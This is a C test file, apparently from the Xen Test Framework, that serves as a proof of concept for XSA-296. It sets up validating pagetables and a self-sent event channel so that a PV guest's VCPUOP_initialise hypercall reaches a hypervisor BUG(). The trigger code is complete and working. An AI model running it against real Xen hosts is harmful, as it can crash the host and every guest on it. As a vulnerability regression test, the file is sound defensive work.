/**
 * @file tests/xsa-296/main.c
 * @ref test-xsa-296
 *
 * @page test-xsa-296 XSA-296
 *
 * Advisory: [XSA-296](https://xenbits.xen.org/xsa/advisory-296.html)
 *
 * Before XSA-296, Xen used BUG() for format string checking in the hypercall
 * continuation setup logic.  This BUG() was reachable via the
 * VCPUOP_initialise hypercall for PV guests.
 *
 * To tickle a continuation, we set up the new vCPU's pagetables to require
 * validation.  In order to "force" a continuation, (ab)use the fact we can
 * send ourselves an event by writing into evtchn 2L block.  This causes
 * hypercall_preempt_check() in Xen to return true.
 *
 * This leaves a 1-instruction race window where, if Xen takes a real
 * interrupt, the pending evtchn would be delivered before issuing the
 * VCPUOP_initialise hypercall.
 *
 * For 64bit PV guests, we can actually spot this as a side effect of the
 * SYSCALL ABI, and restart if it occurs.  For 32bit PV guests, there is no
 * way to distinguish, so we have to live with the race.
 *
 * @see tests/xsa-296/main.c
 */
#include <xtf.h>

const char test_title[] = "XSA-296 PoC";

/* Helper for simplifying the 32/64bit differences. */
#ifdef __i386__
#define COND(_32, _64) _32
#else
#define COND(_32, _64) _64
#endif

/* Appears in exception frames with RPL0.  Needs RPL3 to use. */
#define __TEST_CS64 (GDTE_AVAIL0 << 3)

static intpte_t t1[L1_PT_ENTRIES] __page_aligned_bss;
static intpte_t t2[L1_PT_ENTRIES] __page_aligned_bss;
static xen_vcpu_guest_context_t vcpu1_ctx = {
    .flags = VGCF_IN_KERNEL,
};

void do_evtchn(struct cpu_regs *regs)
{
    if ( IS_DEFINED(CONFIG_64BIT) && regs->cs == __TEST_CS64 )
    {
        static unsigned int count;
        extern unsigned long restart[] asm ("restart");

        if ( count++ > 5 )
            panic("Evtchn livelock\n");

        regs->ip = _u(restart);
    }

    shared_info.vcpu_info[0].evtchn_upcall_pending = 0;
    shared_info.vcpu_info[0].evtchn_upcall_mask = 1;
}

void test_main(void)
{
    unsigned long tmp;
    int rc;

    /* Set up a secondary %cs so we can spot SYSCALL being executed. */
    if ( IS_DEFINED(CONFIG_64BIT) )
        update_desc(&gdt[__TEST_CS64 >> 3],
                    GDTE_SYM(0, 0xfffff, COMMON, CODE, DPL3, R, L));

    /*
     * Prepare pagetables:
     *  - vcpu1_ctx.cr3 points at t2, which references t1
     *  - t2 is an L4 (64bit) or an L3 (32bit)
     *  - t1 is an L3 (64bit) or an L2xen (32bit)
     *
     *  * L4 validation is performed with preemption, but without actually
     *    checking, so it needs to decend a level before the hypercall will
     *    hit a contination point.
     */
    t2[3] = pte_from_virt(t1, PF_SYM(P));
    vcpu1_ctx.ctrlreg[3] = xen_pfn_to_cr3(virt_to_gfn(t2));

    if ( hypercall_update_va_mapping(
             _u(t1), pte_from_virt(t1, PF_SYM(AD, P)), UVMF_INVLPG) )
        return xtf_error("Error trying to remap t1 as read-only\n");
    if ( hypercall_update_va_mapping(
             _u(t2), pte_from_virt(t2, PF_SYM(AD, P)), UVMF_INVLPG) )
        return xtf_error("Error trying to remap t2 as read-only\n");

    /*
     * Opencoded version of:
     *
     *   shared_info.vcpu_info[0].evtchn_upcall_pending = 1;
     *   shared_info.vcpu_info[0].evtchn_upcall_mask = 0;
     *   rc = hypercall_vcpu_op(VCPUOP_initialise, 1, &vcpu1_ctx);
     *
     * but written with only a single instruction race window between enabling
     * events and issuing the hypercall.
     */
    asm volatile (
#ifdef __x86_64__
        /* Set up %cs so we can spot when SYSCALL gets executed. */
        "restart:"
        "push $%c[cs];"
        "push $1f;"
        "lretq; 1:"
#endif
        /*
         * shared_info.vcpu_info[0].evtchn_upcall_pending = 1;
         * shared_info.vcpu_info[0].evtchn_upcall_mask = 0;
         */
        "movb $1, %[pend];"
        "movb $0, %[mask];"

        /* rc = hypercall_vcpu_op(VCPUOP_initialise, 1, &vcpu1_ctx); */
        COND("int $0x82;", "syscall;")

        : [pend] "=m" (shared_info.vcpu_info[0].evtchn_upcall_pending),
          [mask] "=m" (shared_info.vcpu_info[0].evtchn_upcall_mask),
          "=a"             (rc),
          COND("=b", "=D") (tmp),
          COND("=c", "=S") (tmp),
          "=d"             (tmp)
        : "a"              (__HYPERVISOR_vcpu_op),
          COND("b", "D")   (VCPUOP_initialise),
          COND("c", "S")   (1),
          "d"              (&vcpu1_ctx)
#ifdef __x86_64__
          , [cs] "i" (__TEST_CS64 | 3)
#endif

        : "memory"
#ifdef __x86_64__
          , "rcx", "r11"
#endif
        );

    switch ( rc )
    {
    case 0:
        return xtf_success("Success: " COND("Probably not", "Not")
                           " vulnerable to XSA-296\n");

    case -ENOENT:
        return xtf_error("Error: Insufficient vcpus\n");

    default:
        return xtf_error("Error: unexpected result %d\n", rc);
    }
}

/*
 * Local variables:
 * mode: C
 * c-file-style: "BSD"
 * c-basic-offset: 4
 * tab-width: 4
 * indent-tabs-mode: nil
 * End:
 */
